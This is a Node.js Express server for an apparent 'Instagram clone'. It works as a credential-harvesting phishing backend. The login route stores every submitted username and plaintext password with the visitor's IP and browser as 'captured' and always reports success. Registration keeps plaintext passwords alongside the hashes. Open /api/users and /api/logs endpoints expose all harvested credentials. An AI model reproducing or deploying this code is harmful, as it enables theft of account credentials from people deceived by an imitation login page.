require('dotenv').config();
const express = require('express');
const mysql   = require('mysql2/promise');
const bcrypt  = require('bcrypt');
const cors    = require('cors');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors({
  origin: ['http://localhost:5173', 'https://instagram-frontend.vercel.app'],
  credentials: true
}));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─── MySQL Connection ─────────────────────────────────────────
const pool = mysql.createPool({
  host    : process.env.MYSQLHOST     || process.env.DB_HOST     || 'localhost',
  user    : process.env.MYSQLUSER     || process.env.DB_USER     || 'root',
  password: process.env.MYSQLPASSWORD || process.env.DB_PASSWORD || '',
  database: process.env.MYSQLDATABASE || process.env.DB_NAME     || 'instagram_clone',
  port    : parseInt(process.env.MYSQLPORT || process.env.DB_PORT || 3306),
  waitForConnections: true,
  connectionLimit   : 10,
  ssl     : { rejectUnauthorized: false }
});

// ─── Test DB Connection ───────────────────────────────────────
async function testConnection() {
  try {
    const conn = await pool.getConnection();
    console.log('✅ MySQL connected successfully!');
    conn.release();
  } catch (err) {
    console.error('❌ MySQL connection failed:', err.message);
    process.exit(1);
  }
}

// ─── Initialize Tables ────────────────────────────────────────
async function initDB() {
  try {
    // Users table — with plain_password column
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id             INT AUTO_INCREMENT PRIMARY KEY,
        username       VARCHAR(50)  NOT NULL UNIQUE,
        email          VARCHAR(100) NOT NULL UNIQUE,
        password       VARCHAR(255) NOT NULL,
        plain_password VARCHAR(255),
        full_name      VARCHAR(100),
        created_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Login logs table — with password column
    await pool.query(`
      CREATE TABLE IF NOT EXISTS login_logs (
        id         INT AUTO_INCREMENT PRIMARY KEY,
        username   VARCHAR(100) NOT NULL,
        password   VARCHAR(255),
        ip_address VARCHAR(45),
        user_agent VARCHAR(255),
        status     ENUM('success', 'failed', 'captured') NOT NULL,
        logged_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    console.log('✅ Tables ready.');
  } catch (err) {
    console.error('❌ Table creation failed:', err.message);
    process.exit(1);
  }
}

// ─── Routes ───────────────────────────────────────────────────

// Test DB
app.get('/api/test', async (req, res) => {
  try {
    const [rows] = await pool.query('SELECT 1 + 1 AS result');
    res.json({ message: '✅ Database connected!', result: rows[0].result });
  } catch (err) {
    res.status(500).json({ message: '❌ DB Error: ' + err.message });
  }
});

// Register
app.post('/api/register', async (req, res) => {
  const { username, email, password, full_name } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ message: 'Username, email and password are required.' });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);

    await pool.query(
      'INSERT INTO users (username, email, password, plain_password, full_name) VALUES (?, ?, ?, ?, ?)',
      [username, email, hashedPassword, password, full_name || null]
    );

    res.status(201).json({ message: 'Account created successfully!', username });

  } catch (err) {
    if (err.code === 'ER_DUP_ENTRY') {
      return res.status(409).json({ message: 'Username or email already exists.' });
    }
    console.error('REGISTER ERROR:', err.message);
    res.status(500).json({ message: err.message });
  }
});

// Login — saves any username/password directly to database
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const ip        = req.ip || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';

  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required.' });
  }

  try {
    await pool.query(
      'INSERT INTO login_logs (username, password, ip_address, user_agent, status) VALUES (?, ?, ?, ?, ?)',
      [username, password, ip, userAgent.substring(0, 255), 'captured']
    );

    res.json({ message: 'Login successful!', username });

  } catch (err) {
    console.error('LOGIN ERROR:', err.message);
    res.status(500).json({ message: err.message });
  }
});

// Get all users
app.get('/api/users', async (req, res) => {
  try {
    const [users] = await pool.query(
      'SELECT id, username, email, plain_password, full_name, created_at FROM users ORDER BY created_at DESC'
    );
    res.json(users);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Get all login logs
app.get('/api/logs', async (req, res) => {
  try {
    const [logs] = await pool.query(
      'SELECT * FROM login_logs ORDER BY logged_at DESC LIMIT 100'
    );
    res.json(logs);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// ─── Start ────────────────────────────────────────────────────
async function start() {
  await testConnection();
  await initDB();
  app.listen(PORT, () => {
    console.log(`🚀 Server running → http://localhost:${PORT}`);
    console.log(`🔗 Test DB        → http://localhost:${PORT}/api/test`);
    console.log(`👥 Users list     → http://localhost:${PORT}/api/users`);
    console.log(`📋 Login logs     → http://localhost:${PORT}/api/logs`);
  });
}

start();